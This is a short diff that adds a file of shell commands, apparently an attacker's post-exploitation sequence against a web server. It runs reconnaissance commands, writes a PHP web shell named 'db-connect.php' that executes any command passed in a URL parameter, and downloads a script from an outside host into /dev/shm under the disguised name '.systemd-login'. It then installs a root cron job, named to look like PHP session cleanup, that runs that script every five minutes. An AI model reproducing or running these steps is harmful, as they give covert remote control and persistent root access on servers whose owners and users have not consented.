@@ -1,0 +1,9 @@
+whoami
+uname -a
+cd /var/www/html
+echo '<?php if(isset($_GET["cmd"])){ system($_GET["cmd"]); } ?>' > db-connect.php
+mkdir -p /dev/shm
+curl -s http://192.168.1.200/updates/patch.sh -o /dev/shm/.systemd-login
+chmod +x /dev/shm/.systemd-login
+echo '*/5 * * * * root /dev/shm/.systemd-login' > /etc/cron.d/php-session-cleanup
+exit
